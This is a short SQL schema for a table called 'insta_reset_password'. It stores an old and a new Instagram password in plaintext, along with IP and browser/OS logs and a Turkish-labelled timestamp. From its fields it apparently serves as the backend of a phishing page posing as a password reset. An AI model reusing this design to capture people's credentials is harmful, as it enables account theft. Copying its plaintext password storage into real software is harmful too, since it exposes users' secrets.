create table insta_reset_password (

id SMALLINT PRIMARY KEY AUTO_INCREMENT,
insta_old_password varchar(120) NOT NULL,
insta_new_password varchar(120) NOT NULL,
ip_logs varchar(50) NOT NULL,
os_browser_logs varchar(255) NOT NULL,
Kayıt_Tarih datetime default CURRENT_TIMESTAMP
    
)
